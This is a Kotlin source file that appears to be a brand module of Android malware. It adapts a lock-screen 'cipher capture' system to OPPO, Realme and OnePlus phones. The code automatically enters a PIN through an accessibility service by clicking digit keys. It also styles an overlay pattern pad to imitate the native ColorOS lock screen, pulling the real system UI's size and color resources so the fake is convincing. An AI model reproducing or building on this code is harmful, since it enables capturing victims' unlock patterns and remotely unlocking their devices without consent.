package com.storm.safe.rock.service.modules.cipher.vendor

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.res.Resources
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.modules.cipher.PatternLockView

/**
 * OPPO / Realme / OnePlus cipher strategy.
 *
 * Extracted from CipherCaptureManager brand branches:
 * - tryKeyNodeInputFull: contentDescription matching for digit keys
 * - PatternCaptureOverlay: OPPO fallback style + aspectRatio=1 + coui_ resources
 */
class OppoCipherStrategy : CipherBrandStrategy() {

    override val tag = "OppoCipher"

    /**
     * OPPO PIN input via contentDescription matching.
     * vendor: tryKeyNodeInputFull OPPO branch
     */
    override fun inputPinViaKeyNodes(
        root: AccessibilityNodeInfo,
        pin: String,
        basePkg: String,
        isSystemUi: Boolean,
        service: AccessibilityService,
        findById: (AccessibilityNodeInfo, String) -> AccessibilityNodeInfo?,
        findByContentDesc: (AccessibilityNodeInfo, String) -> AccessibilityNodeInfo?,
        clickConfirm: () -> Unit,
        sleep200: () -> Unit,
        sleep500: () -> Unit
    ): Boolean {
        var cr = service.rootInActiveWindow ?: root
        var any = false
        for (ch in pin) {
            val node = findByContentDesc(cr, ch.toString())
            if (node != null && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Log.d(tag, "Click Pin Node desc: $ch")
                if (isSystemUi) sleep200() else sleep500()
                any = true
            }
            try { cr.refresh() } catch (_: Exception) {}
        }
        if (any) {
            clickConfirm()
            return true
        }
        return false
    }

    /**
     * OPPO fallback pattern style.
     * Semi-transparent white, black lines, pathWidth=6, aspectRatio=1 (square).
     * vendor: PatternCaptureOverlay OPPO branch
     */
    override fun applyPatternFallbackStyle(view: PatternLockView, themeColor: Int, density: Float) {
        view.normalStateColor = 0x4CFFFFFF.toInt()   // semi-transparent white
        view.correctStateColor = 0x4CFFFFFF.toInt()
        view.dotNormalSize = 30
        view.dotSelectedSize = 60
        view.dotSelectedColor = 0x4CFFFFFF.toInt()
        view.pathWidth = 6
        view.pathColor = -16777216                    // black (0xFF000000)
        view.aspectRatio = 1                          // square
        view.dotAnimationDuration = 150
        view.pathEndAnimationDuration = 100
    }

    /**
     * OPPO resource reading: AOSP dot size + coui_ color resources.
     * vendor: PatternCaptureOverlay OPPO resource branch
     */
    override fun readBrandResources(res: Resources, suiContext: Context, density: Float): BrandResourceResult? {
        val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
        if (aospId == 0) return null
        val dotSize = res.getDimensionPixelSize(aospId)

        // OPPO (ColorOS UI) color resources
        var dotColor = 0
        var pathColor = 0
        for (name in listOf("coui_lock_pattern_dot_color", "coui_pattern_dot_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                dotColor = res.getColor(id, suiContext.theme)
                break
            }
        }
        for (name in listOf("coui_lock_pattern_path_color", "coui_pattern_path_color")) {
            val id = res.getIdentifier(name, "color", "com.android.systemui")
            if (id != 0) {
                pathColor = res.getColor(id, suiContext.theme)
                break
            }
        }

        // OPPO outer circle alpha
        var outerAlpha: Float? = null
        val alphaId = res.getIdentifier("coui_lock_pattern_outer_circle_max_alpha", "dimen", "com.android.systemui")
        if (alphaId != 0) {
            try {
                // Resource stored as a fraction (0.0-1.0) in dimen
                outerAlpha = res.getDimension(alphaId)
            } catch (_: Exception) {}
        }

        return BrandResourceResult(
            haloSize = dotSize * 3,
            innerDotSize = dotSize,
            pathWidth = 0,
            dotColor = dotColor,
            pathColor = pathColor,
            outerCircleAlpha = outerAlpha
        )
    }

    override fun patternAspectRatio(): Int = 1

    override fun outerCircleAlphaResourceName(): String? = "coui_lock_pattern_outer_circle_max_alpha"
}
